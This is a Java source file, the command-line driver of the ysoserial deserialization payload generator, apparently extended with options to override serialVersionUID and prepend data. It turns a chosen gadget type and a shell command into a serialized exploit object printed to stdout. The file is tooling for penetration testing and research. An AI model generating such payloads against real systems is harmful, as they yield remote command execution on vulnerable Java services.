package ysoserial;

import java.io.PrintStream;
import java.util.*;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.ParseException;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
    private static final int INTERNAL_ERROR_CODE = 70;
    private static final int USAGE_CODE = 64;

    public static void main(final String[] argv) {
        CommandLine commandLine = null;
        Options options = new Options();

        Option serial = Option.builder("s")
            .longOpt("serial")
            .numberOfArgs(1)
            .argName("Class=long")
            .desc("Override serialVersionUID for a given class")
            .build();
        Option prepend = Option.builder("p")
            .longOpt("prepend")
            .numberOfArgs(1)
            .argName("Class=str")
            .desc("Prepend payload with item(s)")
            .build();
        Option help = Option.builder("h")
            .longOpt("help")
            .desc("Print usage")
            .build();

        options.addOption(serial);
        options.addOption(prepend);
        options.addOption(help);

        CommandLineParser parser = new DefaultParser();
        try {
            commandLine = parser.parse(options, argv);
        } catch (ParseException exp) {
            System.err.println("Unexpected exception:" + exp.getMessage());
            System.exit(USAGE_CODE);
        }
        String [] args = commandLine.getArgs();
        if (args.length != 2 || commandLine.hasOption("help")) {
            printUsage();
            System.exit(USAGE_CODE);
        }

        List<String> serialObjects = new ArrayList<String>();
        if(commandLine.hasOption("serial")) {
            String [] propvalues = commandLine.getOptionValues("serial");
            for (String propvalue : propvalues) {
                serialObjects.add(propvalue);
            }
        }
        List<String> prependedObjects = new ArrayList<String>();
        if(commandLine.hasOption("prepend")) {
            String [] propvalues = commandLine.getOptionValues("prepend");
            for (String propvalue : propvalues) {
                prependedObjects.add(propvalue);
            }
        }

        final String payloadType = args[0];
        final String command = args[1];

        final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            printUsage();
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            PrintStream out = System.out;
            Serializer.serialize(object, out, serialObjects, prependedObjects);
            ObjectPayload.Utils.releasePayload(payload, object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }

    private static void printUsage() {
        System.err.println("Y SO SERIAL?");
        System.err.println("Usage: java -jar ysoserial-[version]-all.jar [options] <payload> '<command>'");
        System.err.println("  Options:");
        System.err.println("    -h,--help                  Print usage\n");
        System.err.println("    -s,--serial <Class=long>   Override serialVersionUID for a given class:\n"+
                           "      ex. -s org.apache.commons.beanutils.BeanComparator=-3490850999041592962 ...\n");
        System.err.println("    -p,--prepend <Object=val>  Prepend payload with the following item(s):\n"+
                           "      Possible values:\n"+
                           "      - raw data: write=HEX, write{Boolean|Byte|Bytes|Char|Chars|Double|Float|Int|Long|Short|UTF}=STR\n"+
                           "      - serialized object: Class=STR or Class\n"+
                           "      ex. -p writeBoolean=true -p writeUTF=Ficelle -p write=aced0005 -p java.util.ArrayList ...\n");
        System.err.println("  Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
            new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
